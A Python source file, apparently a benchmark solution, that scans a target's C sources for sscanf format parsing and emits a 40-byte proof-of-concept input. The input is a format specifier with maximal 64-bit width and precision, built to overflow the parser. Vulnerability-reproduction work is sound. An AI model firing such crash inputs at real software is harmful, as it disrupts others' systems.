import os
import re
import tarfile
import tempfile
from typing import Optional


class Solution:
    def _extract(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        with tarfile.open(src_path, "r:*") as tf:
            def is_within_directory(directory: str, target: str) -> bool:
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

            for member in tf.getmembers():
                member_path = os.path.join(tmpdir, member.name)
                if not is_within_directory(tmpdir, member_path):
                    continue
                tf.extract(member, tmpdir)
        entries = os.listdir(tmpdir)
        if len(entries) == 1:
            one = os.path.join(tmpdir, entries[0])
            if os.path.isdir(one):
                return one
        return tmpdir

    def _detect_leading_percent_required(self, root: str) -> bool:
        exts = {".c", ".cc", ".cpp", ".h", ".hh", ".hpp"}
        max_files = 2000
        max_bytes = 262144

        pat1 = re.compile(r'\bsscanf\s*\([^;]{0,600}?"[^"]*%%%[^"]*?\.[^"]*?"', re.DOTALL)
        pat2 = re.compile(r'"[^"]*%%%[^"]*%l[dui][^"]*\.[^"]*%l[dui][^"]*"', re.DOTALL)
        pat3 = re.compile(r'"[^"]*%%%[^"]*%lld[^"]*\.[^"]*%lld[^"]*"', re.DOTALL)

        count = 0
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "dist"}]
            for fn in filenames:
                if count >= max_files:
                    return False
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    sz = os.path.getsize(path)
                    if sz <= 0:
                        continue
                    with open(path, "rb") as f:
                        data = f.read(min(sz, max_bytes))
                    try:
                        s = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                except Exception:
                    continue

                count += 1
                if (pat1.search(s) is not None) or (pat2.search(s) is not None) or (pat3.search(s) is not None):
                    return True
        return False

    def solve(self, src_path: str) -> bytes:
        root = self._extract(src_path)

        max19 = "9223372036854775807"  # 19 digits
        max18 = "922337203685477580"   # 18 digits

        need_percent = self._detect_leading_percent_required(root)
        if need_percent:
            poc = ("%" + max19 + "." + max18 + "d").encode("ascii")
        else:
            poc = (max19 + "." + max19 + "d").encode("ascii")

        if len(poc) != 40:
            if poc.startswith(b"%"):
                w = max19
                p = max19
                if len(("%" + w + "." + p + "d")) > 40:
                    p = max18
                poc = ("%" + w + "." + p + "d").encode("ascii")
            else:
                w = max19
                p = max19
                poc = (w + "." + p + "d").encode("ascii")
            if len(poc) > 40:
                poc = poc[:40]
            elif len(poc) < 40:
                poc = poc + (b"0" * (40 - len(poc)))

        return poc